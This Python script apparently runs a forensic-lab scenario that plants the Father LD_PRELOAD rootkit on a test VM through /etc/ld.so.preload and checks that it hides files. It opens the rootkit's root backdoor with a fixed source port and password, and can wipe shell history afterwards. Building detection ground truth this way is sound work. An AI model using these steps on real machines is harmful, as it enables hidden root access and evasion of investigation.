"""Explicit runner for the Father LD_PRELOAD scenario."""

from __future__ import annotations

import socket
from collections.abc import Callable
from pathlib import Path

import yaml

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient
from scenarios.command_log import record_operation, run_logged_command

SCENARIO_ID = "userland_father_ldpreload"
CLEANUP_SCENARIO_ID = "userland_father_ldpreload_cleanup"
ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/father-upstream-4eb2712.tar"
BUILD_SCRIPT = ROOT / "files/build.sh"
LOCK = ROOT / "father.lock.yml"
ARTIFACT_NAME = "rk.so"

REMOTE_ROOT = "/tmp/forensic-lab/father_ldpreload"
UPLOAD_PATH = "/tmp/father-upstream-4eb2712.tar"
REMOTE_BUILD_ROOT = "/tmp/forensic-lab/father_build"
REMOTE_BUILD_SCRIPT = "/tmp/father-build.sh"
REMOTE_ARTIFACT = f"/tmp/{ARTIFACT_NAME}"

# Father defaults
INSTALLED_LIBRARY = "/lib/selinux.so.3"
PRELOAD_CONFIG = "/etc/ld.so.preload"
SOURCE_PORT = 54321
SHELL_PASSWORD = b"lobster\0"
AUTHENTICATION_PROMPT = b"\n\nAUTHENTICATE: "
SHELL_MARKER = b"Enjoy the shell!"

# Only intentional Father customization
HIDDEN_PREFIX = "__malicious_"
HIDDEN_FILE_NAME = f"{HIDDEN_PREFIX}file"
HIDDEN_DIR = f"{REMOTE_ROOT}/probe"
LIST_HIDDEN_DIR = f"ls -la -- {HIDDEN_DIR}"

CLEANUP_COMMANDS = (
    f"rm -f -- {REMOTE_ARTIFACT}",
    "history -c",
    'rm -f -- "${HISTFILE:-$HOME/.bash_history}"',
    "unset HISTFILE",
)


def run_father(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    scenario_id: str,
    artifact_path: Path,
    build_record: dict,
) -> tuple[dict, Callable[[], None]]:
    """Run Father visibly in Bash, then validate its native accept-hook shell."""
    if scenario_id not in (SCENARIO_ID, CLEANUP_SCENARIO_ID):
        raise ValueError(f"Unsupported Father scenario: {scenario_id}")

    cleanup = scenario_id == CLEANUP_SCENARIO_ID
    transcript_path.touch()
    console.scope("HOST", "stage Father artifact")
    source = build_record["source"]
    _upload_artifact(ssh, command_log_path, artifact_path)

    terminal = ssh.open_terminal()
    cleanup_facts = {}
    backdoor_socket = None

    def close_backdoor_socket() -> None:
        nonlocal backdoor_socket
        if backdoor_socket is None:
            return
        backdoor_socket.close()
        backdoor_socket = None

    try:
        with terminal:
            console.scope("GUEST", "verify prepared artifact")
            guest_identity = run_logged_command(
                terminal,
                command_log_path,
                ". /etc/os-release; "
                "printf '%s-%s %s\\n' \"$ID\" \"$VERSION_ID\" \"$(uname -m)\"",
                timeout=180,
            ).combined_output
            try:
                expected = (
                    f"{build_record['target']['distro_id']} "
                    f"{build_record['target']['arch']}"
                )
                if guest_identity != expected:
                    raise RuntimeError(
                        f"Father artifact targets {expected}, guest is {guest_identity}"
                    )
            except Exception as exc:
                record_operation(
                    command_log_path, "verify_guest_identity", error=str(exc)
                )
                raise
            record_operation(command_log_path, "verify_guest_identity")

            console.scope("GUEST", "install and activate")
            for command in (
                f"mkdir -p {HIDDEN_DIR}",
                f"sudo -n install -m 0644 {REMOTE_ARTIFACT} {INSTALLED_LIBRARY}",
                f"touch {HIDDEN_DIR}/{HIDDEN_FILE_NAME}",
            ):
                run_logged_command(terminal, command_log_path, command, timeout=180)

            visible_listing = run_logged_command(
                terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
            ).combined_output
            if HIDDEN_FILE_NAME not in visible_listing:
                raise RuntimeError("Controlled file was not visible before activation")

            for command in (
                f"printf '%s\\n' {INSTALLED_LIBRARY} "
                f"| sudo -n tee {PRELOAD_CONFIG}",
                "sudo -n systemctl restart ssh.service",
            ):
                run_logged_command(terminal, command_log_path, command, timeout=180)

            console.scope("GUEST", "validate behavior")
            hidden_listing = run_logged_command(
                terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
            ).combined_output
            if HIDDEN_FILE_NAME in hidden_listing:
                raise RuntimeError("Controlled file remained visible after activation")

            console.scope("HOST", "validate Father backdoor")
            try:
                identity, backdoor_socket = _validate_backdoor(ssh)
            except Exception as exc:
                record_operation(command_log_path, "validate_backdoor", error=str(exc))
                raise
            record_operation(command_log_path, "validate_backdoor")

            if cleanup:
                console.scope("GUEST", "cleanup treatment")
                for command in CLEANUP_COMMANDS:
                    run_logged_command(
                        terminal,
                        command_log_path,
                        command,
                        timeout=180,
                    )
                uploaded_artifact_absent = run_logged_command(
                    terminal,
                    command_log_path,
                    f"test ! -e {REMOTE_ARTIFACT}",
                    timeout=180,
                ).exit_code == 0
                home_bash_history_absent = run_logged_command(
                    terminal,
                    command_log_path,
                    'test ! -e "${HISTFILE:-$HOME/.bash_history}"',
                    timeout=180,
                ).exit_code == 0
                persistence_present = run_logged_command(
                    terminal,
                    command_log_path,
                    f"test -e {PRELOAD_CONFIG} && test -e {INSTALLED_LIBRARY}",
                    timeout=180,
                ).exit_code == 0
                cleanup_facts = {
                    "cleanup": {
                        "uploaded_artifact_absent": uploaded_artifact_absent,
                        "home_bash_history_absent": home_bash_history_absent,
                        "preload_config_present": persistence_present,
                        "installed_library_present": persistence_present,
                    }
                }
    except BaseException:
        close_backdoor_socket()
        raise
    finally:
        try:
            transcript_path.write_text(terminal.transcript, encoding="utf-8")
        except BaseException:
            close_backdoor_socket()
            raise

    try:
        facts = {
            "source": source,
            "installed_library_path": INSTALLED_LIBRARY,
            "preload_config_path": PRELOAD_CONFIG,
            "hidden_file_path": f"{HIDDEN_DIR}/{HIDDEN_FILE_NAME}",
            "file_hiding_validated": True,
            "backdoor_identity": identity,
            "backdoor_connection_open_at_scenario_completion": True,
            "trigger_source_port": SOURCE_PORT,
            "listener_service": "sshd",
            "listener_port": ssh.port,
        }
        facts.update(cleanup_facts)
        assert backdoor_socket is not None
        return facts, close_backdoor_socket
    except BaseException:
        close_backdoor_socket()
        raise


def verify_source() -> dict:
    """Check the vendored archive against the pinned lock. Host-side, no VM."""
    lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
    archive_hash = file_sha256(ARCHIVE)
    expected_hash = lock["retrieval"]["archive_sha256"]
    if archive_hash != expected_hash:
        raise RuntimeError(
            "Father archive SHA-256 mismatch: "
            f"expected {expected_hash}, got {archive_hash}"
        )
    console.ok(f"Father source verified: {archive_hash}")
    return {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
    }


def _upload_artifact(
    ssh: SSHClient,
    command_log_path: Path,
    artifact_path: Path,
) -> None:
    console.step(f"Uploading {artifact_path.name} to {REMOTE_ARTIFACT}...")
    try:
        ssh.put(artifact_path, REMOTE_ARTIFACT)
    except Exception as exc:
        record_operation(command_log_path, "upload_artifact", error=str(exc))
        raise
    record_operation(command_log_path, "upload_artifact")


def _validate_backdoor(
    ssh: SSHClient,
) -> tuple[str, socket.socket]:
    console.step(
        f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
        f"{SOURCE_PORT}..."
    )
    client = None
    try:
        client = socket.create_connection(
            (ssh.host, ssh.port),
            timeout=12,
            source_address=("", SOURCE_PORT),
        )
        with client.makefile("rb") as response:
            response.read(len(AUTHENTICATION_PROMPT))
            client.sendall(SHELL_PASSWORD)
            if not any(SHELL_MARKER in line for line in response):
                raise RuntimeError("Father did not open the native shell")

            client.sendall(b"id\n")
            identity = next(
                (
                    line.decode(errors="replace").strip().removeprefix("\x1b[0m")
                    for line in response
                    if b"uid=0(root)" in line and b"gid=1337" in line
                ),
                None,
            )
        if identity is None:
            raise RuntimeError("Father shell did not return the expected root identity")
        console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
        console.ok(f"Father shell identity: {identity}")
        return identity, client
    except OSError as exc:
        if client is not None:
            client.close()
        raise RuntimeError(f"Father backdoor connection failed: {exc}") from exc
    except BaseException:
        if client is not None:
            client.close()
        raise
